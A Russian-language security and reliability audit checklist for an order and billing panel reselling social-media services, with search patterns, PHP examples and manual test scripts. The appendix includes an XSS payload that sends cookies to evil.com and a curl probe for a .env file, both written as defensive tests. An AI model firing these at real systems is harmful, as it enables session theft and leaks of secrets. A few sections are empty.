## 1. Архитектурные ошибки

### 1.1. Жёсткая связность модулей

**Проблема**: Код биллинга напрямую вызывает код API-провайдера без абстракций. Замена провайдера требует переписывания половины кодовой базы.

**Проверка**:
- [ ] Найти все прямые вызовы API провайдеров вне слоя абстракции
- [ ] Проверить наличие интерфейса/абстрактного класса `ProviderInterface` или аналога
- [ ] Убедиться, что добавление нового провайдера не требует изменения кода биллинга

**Паттерны для поиска**:
```
# Ищите прямые HTTP-вызовы к провайдерам в бизнес-логике
rg "curl_exec|file_get_contents|HttpClient->post|axios\.post|fetch\(" --type php --type ts --type js -l
# Ищите захардкоженные URL провайдеров
rg "https?://.*/api/v[0-9]" -l
# Ищите отсутствие интерфейсов провайдеров
rg "class.*Provider" --type php -l | xargs -I{} sh -c 'rg "implements|interface" {} || echo "NO_INTERFACE: {}"'
```

**Критерий**: Если найдены HTTP-вызовы к провайдерам вне выделенного adapter/gateway слоя — это архитектурная ошибка.

---

### 1.2. Отсутствие очередей для заказов

**Проблема**: Заказы обрабатываются синхронно в HTTP-запросе. При 100+ одновременных заказах — таймауты и двойные списания.

**Проверка**:
- [ ] Определить, как обрабатывается создание заказа (синхронно/асинхронно)
- [ ] Проверить наличие очередей (RabbitMQ, Redis Queue, Bull, Sidekiq и т.д.)
- [ ] Убедиться, что списание средств и отправка заказа провайдеру разделены

**Паттерны для поиска**:
```
# Синхронная обработка заказа — тревожный знак
rg "createOrder|placeOrder|new Order" --type php --type ts --type js -A 5
# Ищите использование очередей
rg "Queue|dispatch|enqueue|push.*queue|Bull|Redis.*queue|RabbitMQ" -l
```

**Что должно быть**: Создание заказа → запись в БД со статусом `pending` → списание средств → отправка в очередь → воркер отправляет провайдеру → обновляет статус.

---

### 1.3. Монолит вместо микросервисов (или наоборот)

**Проблема**: На старте — избыточная микросервисная архитектура с 15 сервисами для 100 пользователей, или монолит, где биллинг и API-прокси в одном файле.

**Проверка**:
- [ ] Оценить соотношение сервисов к ожидаемой нагрузке
- [ ] Для монолита: проверить, что модули слабо связаны (dependency injection, event-driven)
- [ ] Для микросервисов: проверить, что нет распределённых транзакций без саги/outbox pattern

---

### 1.4. Отсутствие транзакционности при создании заказа

**Проблема**: Списание средств прошло, а заказ провайдеру не отправился (или наоборот). Деньги сняты, услуги нет.

**Проверка**:
- [ ] Найти код создания заказа и проверить: обёрнут ли в БД-транзакцию?
- [ ] Проверить компенсирующие транзакции при ошибке провайдера
- [ ] Убедиться в наличии статуса `failed` с автоматическим возвратом средств

**Паттерны для поиска**:
```
# Ищите транзакции БД
rg "beginTransaction|DB::transaction|START TRANSACTION|BEGIN TRANSACTION" -l
# Ищите обработку ошибок при создании заказа
rg "catch.*Exception" --type php --type ts --type js -A 3 | grep -i "refund|rollback|revert|return.*balance"
```

## 2. Безопасность и авторизация (OWASP API Top 10)

### 2.1. BOLA — Broken Object Level Authorization (Критично!)

**Проблема**: Пользователь A может просмотреть/изменить заказ пользователя B, просто подставив другой ID в запросе.

**Проверка**:
- [ ] Для каждого API-эндпоинта с параметром ID проверить: есть ли проверка владельца?
- [ ] Протестировать: `GET /api/orders/123` — может ли пользователь B увидеть заказ 123 пользователя A?
- [ ] Проверить массовые эндпоинты: `GET /api/orders` — фильтруются ли по текущему пользователю?

**Паттерны для поиска**:
```
# Ищите эндпоинты с ID-параметрами без проверки владельца
rg "find\(\$id\)|findOrFail\(\$id\)|where.*id.*request" --type php -A 3
# В Node.js
rg "findById\(|findOne\(" --type ts -A 3
# Ищите отсутствие фильтрации по user_id
rg "Order::find|Order::where" --type php -A 2 | grep -v "user_id"
```

**Пример уязвимого кода**:
```php
// ❌ ОШИБКА — нет проверки владельца
$order = Order::find($request->id);
return response()->json($order);

// ✅ ПРАВИЛЬНО
$order = Order::where('id', $request->id)
    ->where('user_id', auth()->id())
    ->firstOrFail();
```

### 2.2. Mass Assignment / Unvalidated Input

**Проблема**: Пользователь может передать `role=admin` или `balance=999999` при обновлении профиля.

**Проверка**:
- [ ] Найти все модели и проверить наличие `$fillable` / `$guarded` (Laravel) или DTO валидации
- [ ] Проверить, что критические поля (balance, role, status) не попадают в mass assignment
- [ ] Протестировать: `PUT /api/user/profile` с полем `balance`

**Паттерны для поиска**:
```
# Laravel: модели без $fillable
rg "class.*extends Model" --type php -l | xargs -I{} sh -c 'rg "fillable" {} || echo "NO_FILLABLE: {}"'
# Express/Node: отсутствие валидации
rg "req\.body" --type ts --type js -A 2 | grep -v "validate\|schema\|joi\|zod\|class-validator"
```

---

### 2.3. SQL Injection

**Проблема**: Прямая подстановка пользовательского ввода в SQL-запросы.

**Проверка**:
- [ ] Найти все raw SQL-запросы и проверить использование параметров
- [ ] Проверить сортировку и фильтрацию (ORDER BY, WHERE с динамическими значениями)

**Паттерны для поиска**:
```
# Raw SQL без параметров
rg "DB::raw|DB::select|->query\(|\.raw\(" --type php --type ts -A 2
# Конкатенация строк в SQL
rg '".*SELECT.*".*\.\s*\$' --type php
rg '".*INSERT.*".*\+.*req\.' --type ts --type js
```

---

### 2.4. Отсутствие Rate Limiting на критичных эндпоинтах

**Проблема**: Брутфорс API-ключей, массовая регистрация, флуд заказами.

**Проверка**:
- [ ] Проверить наличие rate limiter на: `/api/login`, `/api/register`, `/api/orders/create`, `/api/payments`
- [ ] Убедиться, что rate limit привязан к пользователю, а не только к IP
- [ ] Проверить, что API-ключи имеют отдельный rate limit

**Паттерны для поиска**:
```
# Ищите rate limiting
rg "throttle|rateLimit|RateLimiter|slowapi|express-rate-limit" -l
# Если ничего не найдено — критическая ошибка
```

### 2.5. Хранение секретов в коде

**Проблема**: API-ключи провайдеров, секреты платежных шлюзов, пароли БД — в коде или коммитах.

**Проверка**:
- [ ] Проверить `.env.example` — нет ли реальных ключей?
- [ ] Проверить git-историю на утёкшие секреты
- [ ] Убедиться, что `.env` в `.gitignore`

**Паттерны для поиска**:
```
# Секреты в коде
rg "api_key.*=.*['\"][a-zA-Z0-9]{20,}['\"]" -l
rg "secret.*=.*['\"][a-zA-Z0-9]{20,}['\"]" -l
rg "password.*=.*['\"][^'\"]{8,}['\"]" -l
# Проверка gitignore
rg "\.env" .gitignore
```

### 2.6. CORS и CSRF

**Проблема**: API доступно с любого домена (CORS: *), нет CSRF-защиты для форм.

**Проверка**:
- [ ] Найти конфигурацию CORS и проверить allowed origins
- [ ] Убедиться, что API-эндпоинты не принимают запросы с произвольных доменов
- [ ] Проверить наличие CSRF-токенов для cookie-based аутентификации

**Паттерны для поиска**:
```
rg "cors|Access-Control-Allow-Origin" -l
rg "AllowOrigin.*\*|allowedOrigins.*\*" -A 2
rg "CSRF|csrf|xsrf" -l
```

---

### 2.7. Небезопасная аутентификация

**Проблема**: Слабые пароли, отсутствие 2FA для админов, JWT без истечения, API-ключи без ротации.

**Проверка**:
- [ ] Проверить минимальные требования к паролям (длина, сложность)
- [ ] Проверить наличие 2FA для административных аккаунтов
- [ ] Проверить JWT: есть ли `exp` claim? Достаточно ли короткий TTL?
- [ ] Проверить API-ключи: есть ли механизм ротации? Есть ли привязка к IP?

**Паттерны для поиска**:
```
rg "JWT|jwt|token" --type php --type ts -l
rg "exp.*:.*\d+|expiresIn" -A 1
rg "min.*password|password.*min|PasswordValidator" -A 2
rg "two.?factor|2FA|otp|totp" -l
```

## 3. Биллинг и финансовые расчёты

### 3.1. Ошибки float-арифметики (Критично!)

**Проблема**: `0.1 + 0.2 = 0.30000000000000004` в float. При тысячах операций — копейки превращаются в рубли/доллары расхождения.

**Проверка**:
- [ ] Найти все операции с балансом и ценами
- [ ] Проверить, используются ли целые числа (копейки/центы) или Decimal/BCMath
- [ ] Убедиться, что НИГДЕ нет `float` для денег

**Паттерны для поиска**:
```
# Float для денег — тревога
rg "float.*balance|float.*price|float.*amount" --type php --type ts
# Правильная арифметика
rg "bcmath|bcmul|bcadd|bcsub|Decimal|BigDecimal|decimal.js|money.*php|brick/money" -l
# Или хранение в целых (копейках)
rg "balance.*int|price.*int|amount.*int" --type php --type ts -A 1
```

**Примеры**:
```php
// ❌ ОШИБКА
$balance = 100.50;
$newBalance = $balance - 0.10; // может быть 100.39999999999

// ✅ ПРАВИЛЬНО — храним в копейках
$balanceCents = 10050;
$newBalanceCents = $balanceCents - 10; // всегда 10040

// ✅ ПРАВИЛЬНО — BCMath
$newBalance = bcsub($balance, '0.10', 2);
```

### 3.2. Race condition при списании средств

**Проблема**: Два параллельных запроса списывают средства. Баланс: 100₽. Запрос A проверяет (100 > 50 = true), запрос B проверяет (100 > 50 = true). Оба списывают. Баланс: 0₽ вместо отказа второго.

**Проверка**:
- [ ] Найти код списания средств и проверить: есть ли блокировка строки?
- [ ] Проверить использование `SELECT ... FOR UPDATE` или аналогов
- [ ] Протестировать: отправить 10 параллельных запросов на заказ при балансе, достаточном только для 1

**Паттерны для поиска**:
```
# Ищите блокировки при обновлении баланса
rg "FOR UPDATE|lockForUpdate|lock\(|pessimistic" --type php --type ts -l
# Ищите обновление баланса
rg "balance.*=.*-|balance.*-=|decrement.*balance" --type php --type ts -A 3
# Атомарное обновление — правильно
rg "decrement\(|atomic.*update|UPDATE.*SET.*balance.*=.*balance.*-" -l
```

**Пример**:
```php
// ❌ ОШИБКА — race condition
$user = User::find($id);
if ($user->balance >= $price) {
    $user->balance -= $price; // Между этими строками — другой запрос
    $user->save();
}

// ✅ ПРАВИЛЬНО — атомарная операция
DB::transaction(function () use ($userId, $price) {
    $user = User::lockForUpdate()->find($userId);
    if ($user->balance >= $price) {
        $user->decrement('balance', $price);
    } else {
        throw new InsufficientFundsException();
    }
});
```

---

### 3.3. Отсутствие транзакций при переводе средств

**Проблема**: Списание с одного аккаунта прошло, а зачисление на другой — нет. Деньги исчезли.

**Проверка**:
- [ ] Найти все операции перевода/пополнения
- [ ] Убедиться, что списание и зачисление в одной БД-транзакции
- [ ] Проверить двойную запись (double-entry bookkeeping)

---

### 3.4. Неправильная обработка пополнений

**Проблема**: Платёжная система дублирует webhook о пополнении. Баланс пополняется дважды.

**Проверка**:
- [ ] Найти обработчик webhook от платёжной системы
- [ ] Убедиться в проверке уникальности transaction_id (idempotency key)
- [ ] Проверить, что повторный webhook возвращает 200 OK без повторного зачисления

**Паттерны для поиска**:
```
# Ищите обработку платежей
rg "webhook|callback.*payment|payment.*notify|ipn" --type php --type ts -l
# Ищите проверку уникальности
rg "transaction_id|unique.*payment|idempoten" --type php --type ts -A 2
```

---

### 3.5. Chargeback-мошенничество

**Проблема**: Пользователь пополняет баланс, заказывает услуги, затем инициирует chargeback. Услуги оказаны, деньги возвращены банком.

**Проверка**:
- [ ] Проверить наличие логики блокировки аккаунта при chargeback
- [ ] Убедиться, что chargeback автоматически создаёт тикет/уведомление
- [ ] Проверить задержку активации услуг для новых пользователей (24-48ч)

---

### 3.6. Округление и наценка

**Проблема**: Наценка на услуги провайдера округляется по-разному в разных местах. Итоговая цена для клиента может отличаться от расчётной.

**Проверка**:
- [ ] Найти все места расчёта цены для клиента
- [ ] Убедиться, что используется единая функция округления
- [ ] Проверить: совпадает ли цена в каталоге с ценой при заказе?

## 4. API интеграция с провайдерами

### 4.1. Отсутствие таймаутов при запросах к провайдерам

**Проблема**: Провайдер завис — запрос висит бесконечно, воркер заблокирован, очередь останавливается.

**Проверка**:
- [ ] Найти все HTTP-клиенты и проверить установку timeout
- [ ] Убедиться, что timeout разумный (5-15 сек для API, 30 сек для загрузки)
- [ ] Проверить retry-логику: есть ли exponential backoff?

**Паттерны для поиска**:
```
# HTTP-клиенты без таймаута
rg "curl_init|GuzzleHttp|axios|fetch\(|HttpClient" --type php --type ts -A 5 | grep -v "timeout"
# Правильно — с таймаутом
rg "timeout.*=>.*\d+|setTimeout|CURLOPT_TIMEOUT" -l
```

---

### 4.2. Обработка ошибок провайдеров

**Проблема**: Провайдер возвращает `{"error": "Insufficient funds"}` или HTTP 500 — панель не обрабатывает и показывает клиенту техническую ошибку.

**Проверка**:
- [ ] Найти все вызовы API провайдеров и проверить обработку HTTP-кодов
- [ ] Убедиться, что ошибки провайдера логируются
- [ ] Проверить: получает ли клиент понятное сообщение (не техническое)?

**Паттерны для поиска**:
```
# HTTP-вызовы без обработки ошибок
rg "curl_exec|->post\(|->get\(" --type php --type ts -A 10 | grep -c "catch\|error\|status"
```

---

### 4.3. Скрытые лимиты провайдеров (Rate Limits)

**Проблема**: Провайдер не документирует rate limits, но молча отклоняет запросы при превышении. Заказы теряются.

**Проверка**:
- [ ] Проверить: учитываются ли HTTP-заголовки `X-RateLimit-*` от провайдера?
- [ ] Убедиться, что при 429 Too Many Requests запрос повторяется позже
- [ ] Проверить логику: при ошибке провайдера — заказ в статусе `pending` или `failed`?

---

### 4.4. Валидация ссылок социальных сетей

**Проблема**: Клиент передаёт невалидную ссылку (опечатка, несуществующий аккаунт, приватный профиль). Провайдер отклоняет — заказ в вечном `processing`.

**Проверка**:
- [ ] Найти валидацию ссылки перед отправкой провайдеру
- [ ] Проверить поддержку разных форматов (с/без https, с/без www, мобильные ссылки)
- [ ] Убедиться, что emoji и unicode в username/link обрабатываются корректно

**Паттерны для поиска**:
```
# Валидация ссылок
rg "validate.*link|validate.*url|preg_match.*instagram|filter_var.*FILTER_VALIDATE_URL" -A 3
```

---

### 4.5. Резервный провайдер (Fallback)

**Проблема**: Единственный провайдер падает — все заказы останавливаются. Нет fallback-механизма.

**Проверка**:
- [ ] Определить: есть ли резервный провайдер для каждой услуги?
- [ ] Проверить: автоматически ли переключается на fallback при ошибке основного?
- [ ] Убедиться, что клиент не замечает переключения (прозрачность)

## 5. Cron-задачи и фоновые процессы

### 5.1. Дедлок при обработке 30k+ заказов

**Проблема**: Cron-задача обрабатывает все `pending` заказы разом. При 30k заказов — memory_limit, таймаут, частичная обработка.

**Проверка**:
- [ ] Найти cron-задачу обновления статусов
- [ ] Проверить: обрабатывает ли чанками (chunk/batch)?
- [ ] Убедиться, что processed-заказы не обрабатываются повторно
- [ ] Проверить лимит выборки за один запуск

**Паттерны для поиска**:
```
# Выборка всех pending без лимита — тревога
rg "where.*pending.*get\(\)|where.*status.*pending" --type php -A 3 | grep -v "chunk\|limit\|take\|cursor"
# Правильно — чанками
rg "chunk\(|cursor\(|each\(|batch" --type php --type ts -l
```

---

### 5.2. Перекрытие cron-задач (Overlap)

**Проблема**: Cron запускается каждую минуту. Предыдущий запуск ещё не завершился → два процесса обрабатывают одни и те же заказы → дублирование.

**Проверка**:
- [ ] Убедиться в наличии `withoutOverlapping()` (Laravel) или file-lock/flock
- [ ] Проверить: что происходит при ручном запуске cron во время автоматического?
- [ ] Убедиться, что используется уникальный lock per task

**Паттерны для поиска**:
```
rg "withoutOverlapping|onOneServer|flock|mutex|lock.*cron" -l
```

---

### 5.3. Бесконечный retry при ошибке провайдера

**Проблема**: Заказ в статусе `pending`. Cron пытается отправить провайдеру. Провайдер возвращает ошибку. Cron повторяет бесконечно. Баланс списан, услуга не оказана.

**Проверка**:
- [ ] Найти счётчик попыток (retry_count, attempts) в таблице заказов
- [ ] Убедиться, что после N попыток (3-5) заказ переходит в `failed` с возвратом средств
- [ ] Проверить интервалы между попытками (exponential backoff)

---

### 5.4. Часовые пояса в cron-задачах

**Проблема**: Сервер в UTC, cron в UTC, но бизнес-логика ожидает Moscow time. Заказы «завтра» создаются сегодня.

**Проверка**:
- [ ] Проверить timezone сервера, PHP/Node.js, БД
- [ ] Убедиться, что все даты хранятся в UTC
- [ ] Проверить конвертацию при отображении пользователю

**Паттерны для поиска**:
```
rg "date_default_timezone_set|TIMEZONE|timezone|Carbon::" --type php -A 1
rg "setTimeZone|tz\(|timezone" --type ts -A 1
```

## 6. Вебхуки и синхронизация статусов

### 6.1. Потеря вебхуков

**Проблема**: Провайдер отправляет webhook о завершении заказа. Сервер был недоступен 5 минут. Webhook потерян. Заказ навсегда в `processing`.

- [ ] Проверить: webhook — единственный способ обновления или есть fallback?
- [ ] Убедиться, что polling покрывает заказы старше N минут без обновления

---

### 6.2. Подделка вебхуков

**Проблема**: Злоумышленник отправляет поддельный webhook «заказ выполнен» → заказ отмечается как `completed` без реального выполнения.

**Проверка**:
- [ ] Найти верификацию подписи webhook (HMAC, secret key)
- [ ] Убедиться, что IP-адрес отправителя верифицируется (whitelist IP провайдера)
- [ ] Проверить: что если подпись невалидна — запрос отклоняется с 403?

**Паттерны для поиска**:


### 6.3. Обработка неидемпотентных вебхуков

**Проблема**: Провайдер отправляет один и тот же webhook 3 раза. Статус обновляется 3 раза. Если есть побочные эффекты (уведомления, начисления) — они выполняются 3 раза.

**Проверка**:
- [ ] Убедиться, что обработка webhook идемпотентна
- [ ] Проверить: если заказ уже `completed` и пришёл webhook `completed` — ничего не происходит?
- [ ] Проверить логирование повторных webhook'ов

---

### 6.4. Несовпадение статусов

**Проблема**: У провайдера статусы: `pending`, `in_progress`, `partial`, `completed`, `cancelled`. У панели: `pending`, `processing`, `completed`, `failed`. Нет маппинга `partial`.

**Проверка**:
- [ ] Найти таблицу/функцию маппинга статусов провайдера → статусы панели
- [ ] Убедиться, что все статусы провайдера учтены
- [ ] Проверить обработку `partial` (частичное выполнение с частичным возвратом)

## 7. Защита от DDoS и Rate Limiting

### 7.1. Многоуровневый Rate Limiting

**Проблема**: Rate limit только на уровне web-сервера (nginx). API-маршруты без защиты.

**Проверка**:
- [ ] Проверить rate limit на уровне: nginx → application → API-ключ
- [ ] Убедиться, что разные эндпоинты имеют разные лимиты
- [ ] Проверить: что происходит при превышении лимита? (429 + Retry-After?)

- [ ] Убедиться, что медленные запросы логируются и алертятся

### 7.3. Защита от ботов

**Проверка**:

## 8. База данных и миграции

### 8.1. Отсутствие индексов

**Проблема**: Таблица `orders` с 1M записей без индекса на `user_id` → запросы списка заказов выполняются 10+ секунд.

**Проверка**:
- [ ] Проверить наличие индексов на: `user_id`, `status`, `provider_id`, `created_at`
- [ ] Проверить составные индексы: `(user_id, status)`, `(status, created_at)`
- [ ] Выполнить `EXPLAIN` на типичных запросах

**SQL для проверки**:
```sql
-- MySQL
SHOW INDEX FROM orders;
SHOW INDEX FROM users;
SHOW INDEX FROM transactions;

-- PostgreSQL
SELECT indexname, indexdef FROM pg_indexes WHERE tablename = 'orders';

-- Найти медленные запросы
SELECT * FROM mysql.slow_log ORDER BY query_time DESC LIMIT 20;
```

---

### 8.2. Отсутствие внешних ключей (Foreign Keys)

**Проблема**: Заказ с `user_id = 999` существует, но пользователя 999 нет. Удаление пользователя оставляет «осиротевшие» заказы.

**Проверка**:
- [ ] Проверить наличие FK: `orders.user_id → users.id`, `transactions.user_id → users.id`
- [ ] Проверить ON DELETE CASCADE/SET NULL для связанных записей
- [ ] Убедиться, что FK проверяются при INSERT (не отключены)

---

### 8.3. Миграции без отката

**Проблема**: Миграция добавляет колонку, но в `down()` — пусто. Откат невозможен.

**Проверка**:
- [ ] Проверить все файлы миграций: есть ли непустой `down()` / `down` метод?
- [ ] Убедиться, что `down()` корректно отменяет `up()`

---

### 8.4. Транзакционные миграции с данными

**Проблема**: Миграция одновременно меняет схему и переносит данные. При ошибке на середине — БД в неконсистентном состоянии.

**Проверка**:
- [ ] Найти миграции, которые изменяют и схему, и данные
- [ ] Убедиться, что они разбиты на: (1) изменение схемы, (2) перенос данных, (3) удаление старых колонок

## 9. Обработка краевых случаев (Edge Cases)

### 9.1. Заказ с нулевой стоимостью

**Проблема**: После применения скидки/купон цена = 0. Списание 0 — ок, но что если провайдер отклонит? Возврат 0 — ок? А если есть комиссия?

**Проверка**:
- [ ] Найти код применения скидок/купонов
- [ ] Проверить: что происходит при итоговой цене = 0?
- [ ] Убедиться, что заказ с ценой 0 не проходит через платёжную систему

---

### 9.2. Unicode и Emoji в ссылках

**Проблема**: Пользователь передаёт ссылку с emoji в username (Instagram поддерживает). Провайдер не принимает — заказ зависает.

**Проверка**:
- [ ] Отправить тестовый заказ с emoji в ссылке
- [ ] Проверить кодировку при отправке провайдеру (URL encode?)
- [ ] Убедиться, что БД поддерживает utf8mb4 (не просто utf8)

**Паттерн для поиска**:
```
rg "utf8|charset|encoding" --type php -A 1 | grep -v "mb4"
```

---

### 9.3. Очень большие и очень маленькие количества

**Проблема**: Клиент заказывает 1 000 000 подписчиков. Или 0 подписчиков. Или -5 подписчиков.

**Проверка**:
- [ ] Найти валидацию `quantity` в создании заказа
- [ ] Проверить минимальное и максимальное значение
- [ ] Убедиться, что проверяется min/max конкретной услуги (разные услуги — разные лимиты)

---

### 9.4. Дублирование заказов

**Проблема**: Пользователь дважды нажимает «Заказать». Создаются 2 идентичных заказа.

**Проверка**:
- [ ] Найти защиту от дублирования на frontend (disable button)
- [ ] Найти защиту на backend (idempotency key, проверка последнего заказа)
- [ ] Убедиться, что один и тот же заказ не создаётся дважды в течение 5 секунд

**Паттерны для поиска**:
```
rg "idempoten|unique.*order|duplicate.*check|last.*order" -l
```

---

### 9.5. Одновременная смена статуса заказа

**Проблема**: Cron обновляет статус заказа на `completed`, а администратор вручную отменяет тот же заказ. Итог: статус `cancelled`, но вебхук провайдера уже обработан как `completed`.

**Проверка**:
- [ ] Найти код обновления статуса и проверить атомарность
- [ ] Убедиться, что переходы статусов валидируются (state machine)
- [ ] Проверить: запрещён ли переход `completed` → `cancelled`?

---

### 9.6. Partial-выполнение и перерасчёт

**Проблема**: Заказано 1000 подписчиков, доставлено 700. Статус `partial`. Необходим возврат за 300 недоставленных. Если расчёт неправильный — клиент теряет деньги или панель теряет.

**Проверка**:
- [ ] Найти логику partial-выполнения
- [ ] Проверить формулу возврата: `(1 - delivered/ordered) * charged`
- [ ] Убедиться, что возврат использует Decimal/BCMath, не float

---

### 9.7. Ссылки с UTM-параметрами и trailing slashes

**Проблема**: Клиент передаёт `https://instagram.com/user?utm_source=xx` или `https://instagram.com/user/`. Провайдер не распознаёт.

**Проверка**:
- [ ] Найти нормализацию ссылок перед отправкой
- [ ] Убедиться, что UTM-параметры удаляются
- [ ] Убедиться, что trailing slash обрабатывается единообразно

---

### 9.8. Временные зоны в отчётах

**Проблема**: Отчёт за «сегодня» в UTC — это не «сегодня» для клиента в GMT+3. Финансовые отчёты расходятся.

**Проверка**:
- [ ] Найти генерацию отчётов и проверить timezone
- [ ] Убедиться, что отчёты за период корректно работают при смене DST

## Приложение А: Быстрые команды для аудита

### Поиск критических паттернов (выполнить все)

```bash
# 1. Float для денег
rg "float.*balance|float.*price|float.*amount" --type php --type ts

# 2. Race condition — обновление баланса без блокировки
rg "balance.*=.*-|balance.*-=|decrement.*balance" --type php --type ts -A 3

# 3. SQL Injection
rg "DB::raw|DB::select|\.raw\(" --type php --type ts -A 2
rg '".*SELECT.*".*\.\s*\$' --type php

# 4. Mass Assignment — модели без fillable
rg "class.*extends Model" --type php -l | while read f; do
  rg -q "fillable" "$f" || echo "NO_FILLABLE: $f"
done

# 5. Секреты в коде
rg "api_key.*=.*['\"][a-zA-Z0-9]{20,}['\"]" -l
rg "password.*=.*['\"][^'\"]{8,}['\"]" -l

# 6. Debug-режим
rg "APP_DEBUG.*true|debug.*true" .env* -l

# 7. CORS wildcard
rg "AllowOrigin.*\*|allowedOrigins.*\*" -A 2

# 8. Без таймаутов
rg "curl_init|GuzzleHttp|axios|fetch\(" --type php --type ts -A 5 | grep -v "timeout"

# 9. Без rate limiting
rg "throttle|rateLimit|RateLimiter" -l || echo "NO_RATE_LIMITING_FOUND"

# 10. Без транзакций
rg "balance.*-=|balance.*=.*-|decrement.*balance" --type php -l | while read f; do
  rg -q "transaction|beginTransaction" "$f" || echo "NO_TRANSACTION: $f"
done
```

## Приложение Б: Тестовые сценарии для ручной проверки

### Сценарий 1: Race condition при списании

```bash
# Отправить 10 параллельных запросов на создание заказа
# Баланс должен покрыть только 1 заказ
for i in $(seq 1 10); do
  curl -X POST https://panel.com/api/orders/create \
    -H "Authorization: Bearer TOKEN" \
    -d "service=1&link=https://instagram.com/test&quantity=100" &
done
wait

# Ожидание: 1 заказ создан, 9 — ошибка "Недостаточно средств"
# Если создано 2+ — race condition подтверждён
```

### Сценарий 2: BOLA — доступ к чужому заказу

```bash
# Пользователь A — заказ #123
# Пользователь B пытается:
curl -X GET https://panel.com/api/orders/123 \
  -H "Authorization: Bearer TOKEN_B"

# Ожидание: 403 Forbidden или 404 Not Found
# Если вернулись данные — BOLA подтверждён
```

### Сценарий 3: Дублирование пополнения

```bash
# Отправить один и тот же webhook 3 раза
for i in $(seq 1 3); do
  curl -X POST https://panel.com/api/payment/webhook \
    -H "Content-Type: application/json" \
    -d '{"transaction_id":"TXN_001","amount":100,"status":"completed"}'
done

# Ожидание: баланс пополнился на 100 один раз
# Если на 300 — нет idempotency
```

### Сценарий 4: XSS в имени

```bash
# Зарегистрироваться с именем:
# <script>document.location='https://evil.com/'+document.cookie</script>
# Проверить: отображается ли как текст в админке?
```

### Сценарий 5: Доступ к .env

```bash
curl https://panel.com/.env
# Ожидание: 403 Forbidden или 404 Not Found
# Если вернулся файл — критическая уязвимость
```
